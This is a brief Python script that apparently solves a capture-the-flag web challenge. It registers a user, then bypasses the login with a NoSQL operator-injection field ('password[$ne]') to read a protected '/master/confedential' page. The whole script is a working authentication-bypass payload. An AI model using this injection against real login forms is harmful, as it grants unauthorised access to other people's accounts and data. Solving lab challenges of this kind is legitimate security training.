import requests

URL = 'https://{INSTANCE}.chal.ctf.ae'

res = requests.post(f'{URL}/register', data={
    'firstName': 'ztz',
    'lastName': 'ztz',
    'phoneNumber': '1234567890',
    'email': 'ztz@ztz',
    'password': 'ztz'
})
print(res.text)

s = requests.Session()
s.post(f'{URL}/login', data={
    'email': 'ztz@ztz.bankmaster',
    'password[$ne]': '1'
})

res = s.get(f'{URL}/master/confedential')
print(res.text)